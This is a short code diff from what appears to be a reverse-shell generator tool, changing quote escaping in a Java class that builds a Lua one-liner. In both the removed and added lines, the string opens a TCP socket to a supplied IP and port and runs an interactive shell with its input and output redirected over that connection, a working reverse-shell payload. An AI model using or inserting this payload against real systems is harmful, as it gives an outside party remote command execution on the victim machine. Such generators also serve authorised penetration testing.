@@ -8,7 +8,7 @@ public class Lua_1 extends Reverse {
 
     public Lua_1(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("lua -e \\\"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('%s -i <&3 >&3 2>&3');\\\"", this.getLocalIP(), this.getLocalPort(), this.getShell());
+        shellFormat = String.format("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('%s -i <&3 >&3 2>&3');\"", this.getLocalIP(), this.getLocalPort(), this.getShell());
     }
 
     @Override
